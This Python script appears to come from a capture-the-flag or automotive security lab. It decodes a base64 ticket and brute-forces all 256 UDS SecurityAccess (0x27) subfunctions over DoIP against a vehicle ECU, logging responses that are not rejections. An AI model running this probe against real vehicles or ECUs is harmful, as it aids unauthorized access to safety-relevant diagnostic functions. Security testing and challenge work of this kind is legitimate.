import sys, base64, struct, json
sys.path.insert(0,"04_SOLVE/uds")
from doip import DoIP, explain

TICKET_B64="3I-tVCsWTfSqqZE-ZrqsQgAAAABq98emLAlQ9atV-YO71pCxdYJwcA"
def b64url(s):
    return base64.urlsafe_b64decode(s+"="*(-len(s)%4))
ticket=b64url(TICKET_B64)
print("ticket len",len(ticket),"hex",ticket.hex())
nonce,exp,tag = ticket[:16], ticket[16:24], ticket[24:]
print("nonce",nonce.hex())
print("exp u64BE",struct.unpack(">Q",exp)[0])
print("tag",tag.hex())

def probe(uds_bytes, label, wait=1.0):
    d=DoIP(); d.connect(); d.routing_activation()
    d.uds(0xE442, bytes.fromhex("1003"), wait=0.6)
    x=d.parse_uds(d.uds(0xE442, uds_bytes, wait=wait))
    d.close()
    s = f"src={x[0]['src']} {explain(x[0]['uds'])}" if x else "EMPTY"
    if "7f277e" not in (x[0]['uds'] if x else ""):
        print(f"  {label:34s} {s}")
    return s

print("=== 27 <sub> + full ticket ===")
hits=[]
for sub in range(0,0x100):
    s=probe(bytes([0x27,sub])+ticket, f"27 {sub:02x} + ticket")
    if "NEG svc=0x27 NRC=0x7e" not in s:
        hits.append((sub,s)); print("   *** HIT ***", sub, s)
print("hits:",hits)
